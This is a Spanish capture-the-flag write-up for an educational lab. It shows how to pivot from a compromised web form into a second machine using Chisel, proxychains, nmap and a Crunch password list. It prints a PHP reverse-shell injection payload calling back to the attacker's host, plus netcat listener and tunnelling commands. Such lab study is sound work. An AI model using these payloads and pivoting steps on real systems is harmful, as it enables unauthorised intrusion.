# CTF-4
*Capture the flag* donde se trabaja el *pivoting* entre máquinas de la misma red, *reverse shell*, escucha de puertos, montaje de un servidor con *Python*.
<div>
  <img src="https://img.shields.io/badge/-Kali-5e8ca8?style=for-the-badge&logo=kalilinux&logoColor=white" />
  <img src="https://img.shields.io/badge/-PHP-777BB4?style=for-the-badge&logo=php&logoColor=white" />
  <img src="https://img.shields.io/badge/-Netcat-F5455C?style=for-the-badge&logo=netcat&logoColor=white" />
  <img src="https://img.shields.io/badge/-python-3776AB?style=for-the-badge&logo=python&logoColor=white" />
  chisel
  Proxychains
  Crunch
  <img src="https://img.shields.io/badge/-Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white" />
</div>
## Objetivo

Explicar la realización del siguiente _Capture the flag_ dentro del mundo educativo. Se pretenden conseguir un archivo (_flags_), dentro del entorno del usuario básico. Para ello, se deberá pivotar desde la máquina resuelta en el [CTF-3](https://github.com/Cibersegurata39/CTF-3) a la máquina de este nuevo reto y una vez dentro pasar al usuario básico.

## Que hemos aprendido?

- Realizar un *pivoting* entre dos máquinas de la misma red.
- Realizar una *reverse shell* con código *php*.
- Poner puertos en escucha.
- Montar un sevidor fácilmente con *Python*.
- Montar un diccionario a partir de una secuencia dada de caracteres.

## Herramientas utilizadas

- *Kali Linux*.
- *Pivoting*: *Python3*, *Chisel*, *Proxychains*.
- Penetración: *Netcat*, *Crunch* . 

## Steps

### Vulnerabilidades explotadas

Partiendo del primer formulario encontrado en el CTF-3, ejecuto una *reverse shell* con código **php**, indicando la dirección IP y el puerto de la máquina local que estará escuchando.

<code>;ls;php -r '$sock=fsockopen("10.0.2.15",1234);exec("/bin/sh -i <&3 >&3 2>&3");';</code>

![image](https://github.com/user-attachments/assets/8ec4b208-1dd2-47d4-8f79-9155f6f56acf)

Para poner en escucha el puerto 1234, utilizo **Netcat**.

<code>nc -lvnp 1234</code>

La conexión ha sido un éxito, la cual muestra la IP de la máquina 172.18.0.2.

![image](https://github.com/user-attachments/assets/9eaefd34-4035-4094-af1e-db536c3b4a07)

Para **pivotar** entre máquinas, es necesario descargar el programa **Chisel** en la máquina atacante. Puesto que también se necesita en la máquina que acabamos de penetrar (máquina intermedia, a partir de ahora), se crea un servidor con **Pyhotn3** desde la carpeta donde se encuentra *Chisel* (máquina atacante). Este sevidor es necesario para poder descargar el programa en la máquina intermedia, ya que no dispone de esta herramienta.

<code>python3 -m http.server 8080</code>

![image](https://github.com/user-attachments/assets/7f85fb6c-c443-49e6-9a1f-174109bea616)

Puesto que que tampoco dispone de los binarios <code>wget</code> o <code>curl</code>, se utiliza un pequeño código *php* para realizar la descarga ('descarga_archivo.php'). En el código se indica la dirección donde se encuentra el *Chisel* (máquina atacante), así como donde guardarlo (máquina intermedia). Se guarda en la carpeta '/tmp' pues desde ahí se tienen permisos de ejecución.

Una vez descargado y otorgados los permisos de ejecución, lo lanzo desde la máquina anfitriona, como servidor, y pongo en escucha el puerto 3456 (por ejemplo).

<code>chisel server --reverse -p 3456</code>

![image](https://github.com/user-attachments/assets/a40614a5-773f-4d32-881f-1c3463a639bc)


También lo lanzo en la máquina intermedia, como cliente, indicándole la dirección IP y puerto de la máquina atacante. Además, con ‘R:socks’ indico que me de acceso a todos las IPs/puertos con las que esté conectada la máquina intermedia (conexión con la máquina víctima a la que se pretende conseguir conectar).

<code>. /chisel client 10.0.2.15:3456 R:socks</code>

![image](https://github.com/user-attachments/assets/d88edd57-7d66-4665-a25d-8ea6fcf3f85d)

Ahora la máquina anfitriona, por medio del puerto 3456, tiene visibilidad de las posibles conexiones de la máquina intermedia, como podría ser la máquina final.

Para hacer un barrido de IPs con el objetivo de encontrar la última máquina, debo utilizar la herramienta **Proxychains** para utilizar el túnel creado con *Chisel*. Se le indica esta dirección IP y puerto creados del puerto (se muestra en la *shell* de la máquina atacante después de realizar la conexión). Esto se modifica desde el archivo de configuración.

<code>sudo nano /etc/proxychains4.conf</code>

Se descomenta la línea que contiene *Dynamic_chain* y se comenta la línea que contiene *static_chain*. Además, al final del archivo se añade ‘socks5 127.0.0.1 1080’ (dirección perteneciente al túnel creado).

![image](https://github.com/user-attachments/assets/1410a5c7-1d8a-4d02-bbee-368ca7cb7b7b)

Para utilzar ahora este túnel se utiliza el comando *Proxychains* y se lanza un *nmap* para hacer el barrido de IPs con la dirección de la máquina intermedia y así encontrar aquellas máquinas que estén en su misma red. Al utilizar *proxychains* sería como lanzar el *nmap* desde la propia máquina intermedia. Se indica que no haga reconocimiento *ping* y finalmente, la máquina final es encontgrada en la dirección 172.18.0.3.

<code>proxychains nmap 172.18.0.0/24 -Pn</code>

![image](https://github.com/user-attachments/assets/f133cc92-395e-4f6e-a3da-e846edcd3917)

Ahora se puede realizar un ataque más centrado en esta máquina y buscar qué puertos tiene abiertos y qué versiones corren en ellos.

<code>proxychains nmap 172.18.0.3 -Pn -sV -p-</code>

![image](https://github.com/user-attachments/assets/241f93d4-06fe-4b98-8ff3-f47a3f37af44)

Se encuentra un servicio *SSH* en el puerto 2222, por lo que se intenta la conexión por medio de *proxychains*. Se encuentra el inconveniente de que ninguna de las contraseñas encontradas en la base de datos no sirven para tener acceso. Igual que en el anterior CTF (CTF-3) se encontró, por medio de *SQLMap*, la tabla con la bandera correspondiente, también se encontró una tabla con diferentes usuarios y contraseñas.

| Usuario | Contraseña |
| ------- | ---------- |
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |
En tal caso, voy a probar diferentes combinaciones de los caracteres de cada contraseña para ver si alguna es la correcta, empezaré con el usuario Pablo pues es el usuario correcto más probable. Para conseguir la permuta de caracteres hago uso de la herramienta Crunch.
